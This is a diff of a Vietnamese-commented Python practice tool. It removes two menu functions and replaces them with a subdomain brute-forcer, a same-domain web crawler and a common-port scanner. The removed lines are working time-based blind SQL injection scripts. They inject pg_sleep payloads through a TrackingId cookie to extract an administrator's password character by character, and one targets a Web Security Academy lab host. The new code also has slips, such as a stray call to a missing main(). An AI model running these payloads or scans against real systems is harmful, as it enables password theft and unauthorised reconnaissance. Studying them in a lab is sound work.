@@ -1,275 +1,299 @@
-import requests
-import time
 from __future__ import annotations
 import sys
 import argparse
-import dns.resolver  #dnspython
+import time
+import requests
+import dns.resolver
+import dns.exception
+import asyncio
+from html.parser import HTMLParser
+from urllib.parse import urljoin, urlparse
+import aiohttp
+import dns.asyncresolver
 import dns.exception
 
-def chuc_nang_1 ():
-    print("Dang chay...")
-    url = input("Input URL: ").strip()
-    Session = input("Input session: ").strip()
-    TrackingId = input("Input TrackingID: ").strip()
-    username = input("Input username: ").strip()
+COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 8080, 8443]
+CRAWL_CONCURRENCY = 5      # số trang crawl cùng lúc - thấp vì đang xin phép crawl 1 site người khác
+RESOLVE_CONCURRENCY = 20   # DNS query nhẹ hơn HTTP nhiều -> cho phép cao hơn
+SCAN_CONCURRENCY = 50      # connect scan cũng nhẹ -> concurrency cao để quét nhanh
+CONNECT_TIMEOUT = 2.0      # chờ tối đa bao lâu cho 1 lần connect port
 
-    #keep alive
-    SESSION = requests.Session()
-    #BKTT
-    cookies = {
-        "TrackingId": TrackingId,
-        "Session": Session,
-    }
+#CHOICE 1 =======================
+def build_resolver(nameservers: list[str] | None = None, timeout: float = 2.0) -> dns.resolver.Resolver:
+    resolver = dns.resolver.Resolver()
+    resolver.timeout = timeout
+    resolver.lifetime = timeout
+    if nameservers:
+        resolver.nameservers = nameservers
+    return resolver
 
-    ###
+def resolve_host(resolver: dns.resolver.Resolver, fqdn: str) -> list[str] | None:
+    try:
+        answer = resolver.resolve(fqdn, "A")
+        return [str(ip) for ip in answer]
+    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
+        return None
+    except dns.exception.Timeout:
+        print(f"  [!] Timeout khi resolve {fqdn}", file=sys.stderr)
+        return None
+    except Exception as e:
+        print(f"  [!] Lỗi không xác định với {fqdn}: {type(e).__name__}", file=sys.stderr)
+        return None
 
-    def blindsql(condition: str) -> bool:
-        # Nếu tên đăng nhập là {username} VÀ điều kiện kiểm tra
-        # {condition} đúng, hãy tạm dừng 4 giây (pg_sleep(4)), 
-        # ngược lại không dừng (pg_sleep(0))
-        #=> CASE WHEN ... THEN ... ELSE ... END ... --
-        payload = (
-            f"{TrackingId}'%3BSELECT+CASE+WHEN+(username='{username}'+AND+"
-            f"({condition}))+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--"
-        )
-        #copy cookie
-        current_cookies = cookies.copy()
-        #payload -> TrackingId
-        current_cookies["TrackingId"] = payload
+def detect_wildcard(resolver: dns.resolver.Resolver, domain: str) -> list[str] | None:
+    probe = f"random-check-not-exist-12345.{domain}"
+    return resolve_host(resolver, probe)
 
-        try:
-            # HTTP GET -> URL just wait for 10s
-            response = SESSION.get(url, cookies=current_cookies, timeout=10)
-            # >=4s is true (pg_sleep(4) - payload)
-            if response.elapsed.total_seconds() >= 4:
-                return True
-        except requests.exceptions.RequestException:
-            pass
-            
-        return False
+def load_wordlist(path: str) -> list[str]:
+    with open(path, "r", encoding="utf-8") as f:
+        return [line.strip() for line in f if line.strip()]
 
-    ###
-    #MAX 50 char, TYPE HINTING: int
-    def find_length(max_len=50) -> int:
+def brute_force(domain: str, wordlist: list[str], resolver: dns.resolver.Resolver, wildcard_ips: list[str] | None) -> dict[str, list[str]]:
+    found: dict[str, list[str]] = {}
+    total = len(wordlist)
 
-        #range(start, stop + 1) -> range(1, 51)
-        for n in range(1, max_len + 1):
+    for i, word in enumerate(wordlist, start=1):
+        fqdn = f"{word}.{domain}"
+        ips = resolve_host(resolver, fqdn)
 
-            # is lenght = n?
-            if blindsql(f"LENGTH(password)={n}"):
-                return n
-            #True return lenght
-        raise RuntimeError("??? WTF if LENgth???")
+        if ips is None:
+            continue
 
-    ###=============================================================
-    # lo is " " and 126 is "~" 
+        if wildcard_ips and set(ips) == set(wildcard_ips):
+            continue
 
-    def find_char_binary(position: int, lo=32, hi=126) -> str:
-        #ASCII 32-126 (a-z 0-9 and "[]{},./?';)
+        found[fqdn] = ips
+        print(f"[+] {fqdn} -> {', '.join(ips)}")
 
-        while lo < hi: # => lo == hi #!!!
+        if i % 100 == 0:
+            print(f"    ... đã thử {i}/{total} từ", file=sys.stderr)
 
-            # (32 + 126) :/ 2 
-            mid = (lo + hi) // 2
+    return found
 
-            # is position is more than mid? TRUE/FALSE
-            # SUBSTRING(password, {position}, 1) => position n, 1passwd
-            # ASCII(...)
-            # > {mid}
-            
-            if blindsql(f"ASCII(SUBSTRING(password,{position},1))>{mid}"):
-                lo = mid + 1 # >50 or >n
-                
-            else:
-                hi = mid # <50 or <n
+#CHOICE 2 =======================
+class LinkExtractor(HTMLParser):
+    def __init__(self):
+        super().__init__()
+        self.links: list[str] = []
 
-        return chr(lo)   #!!!
+    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        if tag != "a":
+            return # chỉ quan tâm thẻ <a>, bỏ qua mọi thẻ khác (img, script...)
+        for attr_name, attr_value in attrs: 
+        # attrs là list các cặp (tên_attr, giá_trị)
+            if attr_name == "href" and attr_value:
+                self.links.append(attr_value) 
+        # lưu href thô (có thể là link tương đối, chưa xử lý)
 
-    ###=============================================================
 
-    def extract_password(length: int) -> str:
-        result = ""
+async def fetch_page(session: aiohttp.ClientSession, url: str) -> str | None:
+    try:
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+            if resp.status != 200:
+                return None
+            return await resp.text()                    # đọc toàn bộ body dạng text, tự decode theo charset trả về
+    except Exception:
+        return None
 
-        for pos in range(1, length + 1):
-            ch = find_char_binary(pos)#position
-            result += ch
 
-            print(f"Position {pos}: {ch} -> Current password: {result}")
-        return result
+def normalize_links(base_url: str, raw_links: list[str]) -> set[str]:
+    base_host = urlparse(base_url).netloc                 
+    # lấy phần "host" của URL gốc, vd "example.com"
+    result = set()
+    for link in raw_links:
+        if link.startswith(("#", "javascript:", "mailto:")):
+            continue                                        
+        # bỏ anchor nội trang / js handler / email link
+        absolute = urljoin(base_url, link)                   
+        # ghép link tương đối với base_url -> thành link đầy đủ
+        if urlparse(absolute).netloc == base_host:            
+        # chỉ giữ link CÙNG domain
+            result.add(absolute)
+    return result
 
-    ###
 
-    if __name__ == "__main__":
-        print("Start...")
-        #main is running
-        try:
-            # n = function
-            n = find_length()
-            print(f"Lenght Password: {n}")
-            # pass = function
-            password = extract_password(n)
-            print(f"Password of {username}: {password}")
+async def crawl(start_url: str, max_pages: int = 10) -> set[str]:
+    visited: set[str] = set()
+    all_links: set[str] = set()
+    queue: list[str] = [start_url]
+    sem = asyncio.Semaphore(CRAWL_CONCURRENCY)
 
-        #ERROR
-        except Exception as e:
-            print(f"Error: {e}")
-def chuc_nang_2():
-    print("Dang chay 2...")
-    url = "https://0a1100eb032f1ab180463b1e00120060.web-security-academy.net/"
-    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
-    password = ""
+    async def visit_one(session: aiohttp.ClientSession, url: str) -> set[str]:
+        async with sem:                                     
+            # giới hạn số request HTTP đồng thời
+            html = await fetch_page(session, url)
+        if not html:
+            return set()
+        parser = LinkExtractor()
+        parser.feed(html)                                    
+        # đưa HTML vào parser -> tự gọi handle_starttag() bên trong
+        return normalize_links(url, parser.links)
 
-    print("Bắt đầu lấy mật khẩu...")
-
-    for i in range(1, 21):  # Mật khẩu dài 20 ký tự
-        found_char = False
-        for c in chars:
-            payload = f"x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{c}') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users--"
-            cookies = {'TrackingId': payload}
-            
-            start_time = time.time()
-            try:
-                requests.get(url, cookies=cookies, timeout=10)
-            except requests.exceptions.Timeout:
-                pass
-            
-            elapsed = time.time() - start_time
-            
-            # Nếu thời gian phản hồi lớn hơn 3.5 giây, ký tự đó là chính xác
-            if elapsed > 3.5:
-                password += c
-                print(f"Vị trí {i}: {c} -> Password hiện tại: {password}")
-                found_char = gef_False = True
+    async with aiohttp.ClientSession() as session:
+        while queue and len(visited) < max_pages:
+            batch = [u for u in queue if u not in visited][:CRAWL_CONCURRENCY]
+            if not batch:
                 break
-                
-        if not found_char:
-            print(f"Không tìm thấy ký tự ở vị trí {i}")
-            break
+            queue = [u for u in queue if u not in batch]      
+            # bỏ batch vừa lấy ra khỏi hàng đợi
+            visited.update(batch)                              
+            # đánh dấu đã (sắp) thăm NGAY, tránh thăm trùng ở vòng sau
 
-    print(f"Mật khẩu hoàn chỉnh: {password}")
-def chuc_nang_3():
-    #!/usr/bin/env python3
-    def build_resolver(nameservers: list[str] | None = None, timeout: float = 2.0) -> dns.resolver.Resolver:
-        resolver = dns.resolver.Resolver() #not system
-        resolver.timeout = timeout #timeout servername
-        resolver.lifetime = timeout  #timeout
-        if nameservers:
-            resolver.nameservers = nameservers  
-            #8.8.8.8 or 1.1.1.1
-        return resolver
+            results = await asyncio.gather(*(visit_one(session, u) for u in batch))
+            for links in results:
+                all_links.update(links)
+                for link in links:
+                    if link not in visited and link not in queue:
+                        queue.append(link)                     
+                        # link mới -> thêm vào hàng đợi để thăm ở vòng kế tiếp
+
+    return all_links
 
 
-    def resolve_host(resolver: dns.resolver.Resolver, fqdn: str) -> list[str] | None:
+    # ================= GIAI ĐOẠN 2: RESOLVE =================
+
+async def resolve_host(resolver: dns.asyncresolver.Resolver, sem: asyncio.Semaphore,
+                        hostname: str) -> tuple[str, list[str]]:
+    async with sem:
         try:
-            answer = resolver.resolve(fqdn, "A")     # gửi query loại A (IPv4) cho fqdn, chờ tối đa "lifetime" giây
-            return [str(ip) for ip in answer]        # answer là iterable các bản ghi -> convert từng cái ra string IP
-        except dns.resolver.NXDOMAIN:
-            # NXDOMAIN = domain KHÔNG TỒN TẠI - kết quả bình thường của
-            # brute-force (đa số từ trong wordlist sẽ rơi vào nhánh này)
-            return None
-        except dns.resolver.NoAnswer:
-            # domain tồn tại nhưng KHÔNG có bản ghi A (có thể chỉ có
-            # CNAME/MX...) - ở mức demo này coi như "không có IP"
-            return None
-        except dns.exception.Timeout:
-            # mạng chậm / nameserver không phản hồi kịp trong "timeout" đã
-            # đặt - KHÔNG có nghĩa là subdomain không tồn tại
-            print(f"  [!] Timeout khi resolve {fqdn}", file=sys.stderr)
-            return None
-        except Exception as e:
-            # bắt các lỗi hiếm gặp khác (vd SERVFAIL) để 1 lỗi lạ không
-            # làm crash cả chương trình giữa chừng khi đang thử hàng ngàn từ
-            print(f"  [!] Lỗi không xác định với {fqdn}: {type(e).__name__}", file=sys.stderr)
-            return None
+            answer = await resolver.resolve(hostname, "A")     # dns.asyncresolver hỗ trợ await trực tiếp (khác dns.resolver đồng bộ)
+            return hostname, [str(ip) for ip in answer]
+        except (dns.exception.DNSException, Exception):
+            return hostname, []                                  # NXDOMAIN/timeout/lỗi khác -> coi như không resolve được
 
 
-    def detect_wildcard(resolver: dns.resolver.Resolver, domain: str) -> list[str] | None:
-        probe = f"random-check-not-exist-12345.{domain}"  # tên gần như chắc chắn không tồn tại thật
-        return resolve_host(resolver, probe)                   # tái dùng lại đúng hàm resolve ở trên
+async def resolve_all(hostnames: set[str]) -> dict[str, list[str]]:
+        resolver = dns.asyncresolver.Resolver()
+        resolver.timeout = 2.0
+        resolver.lifetime = 2.0
+        sem = asyncio.Semaphore(RESOLVE_CONCURRENCY)
+
+        tasks = [resolve_host(resolver, sem, h) for h in hostnames]
+        results = await asyncio.gather(*tasks)
+        return {host: ips for host, ips in results if ips}          # chỉ giữ host resolve được (list ips không rỗng)
+
+async def scan_port(sem: asyncio.Semaphore, ip: str, port: int) -> bool:
+    async with sem:
+        try:
+            reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(ip, port), timeout=CONNECT_TIMEOUT
+            )
+            writer.close()                                     # đóng ngay, ta chỉ cần biết mở được hay không, không cần giao tiếp thêm
+            await writer.wait_closed()
+            return True
+        except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
+            return False
 
 
-    def load_wordlist(path: str) -> list[str]:
-        with open(path, "r", encoding="utf-8") as f:            # mở file, encoding utf-8 để tránh lỗi ký tự lạ
-            return [line.strip() for line in f if line.strip()] # strip() từng dòng, loại dòng rỗng sau khi strip
+async def scan_host(sem: asyncio.Semaphore, ip: str) -> list[int]:
+        tasks = [scan_port(sem, ip, port) for port in COMMON_PORTS]  # tạo 1 task quét CHO MỖI port, chạy cùng lúc bằng gather bên dưới
+        results = await asyncio.gather(*tasks)
+        return [port for port, is_open in zip(COMMON_PORTS, results) if is_open]
 
 
-    def brute_force(domain: str, wordlist: list[str],
-                    resolver: dns.resolver.Resolver,
-                    wildcard_ips: list[str] | None) -> dict[str, list[str]]:
-        found: dict[str, list[str]] = {}
-        total = len(wordlist)
+    # ================= ORCHESTRATION =================
 
-        for i, word in enumerate(wordlist, start=1):             # enumerate: vừa lấy từ vừa đếm thứ tự để in tiến độ
-            fqdn = f"{word}.{domain}"                              # ghép "word" + "." + domain gốc thành subdomain đầy đủ
-            ips = resolve_host(resolver, fqdn)                     # thử resolve, trả list IP hoặc None
+async def run_pipeline(start_url: str, max_pages: int = 10) -> None:
+        print(f"[1/3] Crawling {start_url} (tối đa {max_pages} trang) ...")
+        links = await crawl(start_url, max_pages=max_pages)
+        hostnames = {urlparse(link).netloc.split(":")[0] for link in links}
+        hostnames.add(urlparse(start_url).netloc.split(":")[0])       # luôn thêm chính host gốc, kể cả khi crawl không ra link nào
+        print(f"      Tìm thấy {len(links)} link, {len(hostnames)} hostname khác nhau: {hostnames}")
 
-            if ips is None:
-                continue                                            # không resolve được -> bỏ qua, sang từ tiếp theo
+        print(f"[2/3] Resolving {len(hostnames)} hostname ...")
+        resolved = await resolve_all(hostnames)
+        print(f"      Resolve được {len(resolved)}/{len(hostnames)} hostname.")
 
-            if wildcard_ips and set(ips) == set(wildcard_ips):
-                # domain có wildcard VÀ kết quả trùng y hệt IP wildcard
-                # -> nhiều khả năng là false positive, bỏ qua luôn
-                continue
+        print(f"[3/3] Scanning port trên các IP đã resolve (concurrent) ...")
+        all_ips = {ip for ips in resolved.values() for ip in ips}      # gộp hết IP lại, loại trùng (nhiều host có thể chung 1 IP)
+        scan_sem = asyncio.Semaphore(SCAN_CONCURRENCY)
+        scan_results = dict(zip(
+            all_ips,
+            await asyncio.gather(*(scan_host(scan_sem, ip) for ip in all_ips))
+        ))
 
-            found[fqdn] = ips                                       # ghi nhận kết quả thật vào dict
-            print(f"[+] {fqdn} -> {', '.join(ips)}")                # in ngay lúc tìm thấy, không cần đợi quét xong hết
+        print("\n=== KẾT QUẢ ===")
+        for host, ips in resolved.items():
+            for ip in ips:
+                open_ports = scan_results.get(ip, [])
+                print(f"  {host:35s} {ip:15s} port mở: {open_ports if open_ports else '(không có / bị chặn)'}")
 
-            if i % 100 == 0:                                         # cứ mỗi 100 từ báo tiến độ 1 lần
-                print(f"    ... đã thử {i}/{total} từ", file=sys.stderr)
+#============= MENU ==============
+def subdomain_bruteforce():
+    print("Running Subdomain Brute-force...")
+    domain = input("> Input Domain: ").strip()
+    wordlist_path = input("> Input wordlist file path: ").strip()
+    ns_input = input("> Input nameserver: ").strip()
+    
+    nameservers = ns_input.split() if ns_input else ["8.8.8.8", "1.1.1.1"]
+    timeout_input = input("> Input timeout (giây, mặc định 2.0): ").strip()
+    timeout = float(timeout_input) if timeout_input else 2.0
 
-        return found
+    resolver = build_resolver(nameservers, timeout)
+    try:
+        wordlist = load_wordlist(wordlist_path)
+    except FileNotFoundError:
+        print(f"File not exist > {wordlist_path}")
+        return
+
+    print(f"{len(wordlist)} > {wordlist_path}")
+    print("Testing Wildcard...")
+
+    wildcard_ips = detect_wildcard(resolver, domain)
+    if wildcard_ips:
+        print(f"Domain: {domain} > Wilcard: {wildcard_ips}")
+    else:
+        print("Not found.")
+
+    print(f"Subdomain brute-force {len(wordlist)} > {domain}...\n")
+    results = brute_force(domain, wordlist, resolver, wildcard_ips)
+
+    print(f"Subdomain: {len(results)}")
 
 
-    def main() -> None:
-        parser = argparse.ArgumentParser(description="Subdomain brute-force + DNS resolve")
-        parser.add_argument("domain", help="Domain gốc, vd example.com")
-        parser.add_argument("wordlist", help="Đường dẫn file wordlist")
-        parser.add_argument("--nameservers", nargs="*", default=["8.8.8.8", "1.1.1.1"],
-                            help="DNS resolver dùng để tra cứu (mặc định Google/Cloudflare)")
-        parser.add_argument("--timeout", type=float, default=2.0, help="Timeout mỗi query (giây)")
-        args = parser.parse_args()                                   # parse argv -> object có args.domain, args.wordlist...
+def crawl_resolve_scan():
+    print("Running Web Crawler & Port Scanner...")
+    start_url = input("Input Target URL: ").strip()
+    if not start_url:
+        print("> Invalid")
+        return
+        
+    max_pages_input = input("Input max pages (<= 10): ").strip()
+    max_pages = int(max_pages_input) if max_pages_input.isdigit() else 10
 
-        resolver = build_resolver(args.nameservers, args.timeout)
-        wordlist = load_wordlist(args.wordlist)
-        print(f"[*] Đã nạp {len(wordlist)} từ từ {args.wordlist}")
-
-        print("[*] Kiểm tra wildcard DNS...")
-        wildcard_ips = detect_wildcard(resolver, args.domain)
-        if wildcard_ips:
-            print(f"[!] {args.domain} có WILDCARD DNS (IP: {wildcard_ips}) - "
-                f"sẽ tự loại các kết quả trùng IP này.")
-        else:
-            print("[*] Không phát hiện wildcard.")
-
-        print(f"[*] Bắt đầu brute-force {len(wordlist)} subdomain cho {args.domain}...\n")
-        results = brute_force(args.domain, wordlist, resolver, wildcard_ips)
-
-        print(f"\n[*] Xong. Tìm thấy {len(results)} subdomain thật.")
-
-        # TODO tự thử: thêm ThreadPoolExecutor hoặc asyncio (đã học ở bài
-        # trước) để brute-force nhiều từ CÙNG LÚC thay vì tuần tự - với
-        # wordlist vài ngàn từ, tuần tự sẽ rất chậm.
+    try:
+        asyncio.run(run_pipeline(start_url, max_pages))
+    except Exception as e:
+        print(f"ERROR: {e}")
+        
+        #TODO tự thử:
+        #   1) Thêm giới hạn max_depth cho crawl (hiện chỉ giới hạn theo
+        #      TỔNG SỐ trang, chưa giới hạn theo độ sâu).
+        #   2) Đổi COMMON_PORTS thành range đầy đủ 1-1024, so sánh thời
+        #      gian chạy khi tăng/giảm SCAN_CONCURRENCY.
+        #   3) Gộp thêm bước JSON parsing / logging đã học ở bài trước
+        #      để lưu kết quả ra file thay vì chỉ print().
 
 
     if __name__ == "__main__":
         main()
 
 
-while True:
-    print("\n=== MENU ===")
-    print("1- blind sql")
-    print("2- pass")
-    print("3- subdomain")
-    print("0. Exit")
-    luon_chon = input("Input: ")
-    match luon_chon:
-        case "1":
-            chuc_nang_1()
-        case "2":
-            chuc_nang_2()
-        case "3":
-            chuc_nang_3()
-        case "0":
-            break
-        case _:
-            print("LOl wtf?")
+if __name__ == "__main__":
+    while True:
+        print("\n=== MENU ===")
+        print("1 - Subdomain Brute-force")
+        print("2 - Web Crawler & Port Scanner")
+        print("0 - Exit")
+        
+        luon_chon = input("Input: ").strip()
+        match luon_chon:
+            case "1":
+                subdomain_bruteforce()
+            case "2":
+                crawl_resolve_scan()
+            case "0":
+                print("Goodbye.")
+                break
+            case _:
+                print("Invalid.")
